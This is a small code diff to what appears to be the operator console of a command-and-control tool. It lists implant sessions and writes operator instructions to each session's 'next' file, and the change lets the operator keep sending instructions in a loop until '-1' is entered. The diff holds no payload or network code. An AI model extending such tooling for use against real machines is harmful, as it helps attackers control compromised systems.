@@ -16,6 +16,10 @@ def main():
             implants[num][2] = open(f'Sessions/{subfolders[num]}/next', "r").read()
             print(tabulate([implants[num]], headers=['Num', 'SessionID', 'Status']))
             nextInstr = input("Enter Next Instruction: ")
-            open(f'Sessions/{subfolders[num]}/next', "w").write(nextInstr)
+            while(nextInstr != '-1'):
+                open(f'Sessions/{subfolders[num]}/next', "w").write(nextInstr)
+                implants[num][2] = open(f'Sessions/{subfolders[num]}/next', "r").read()
+                print(tabulate([implants[num]], headers=['Num', 'SessionID', 'Status']))
+                nextInstr = input("Enter Next Instruction: ")
 
 main()
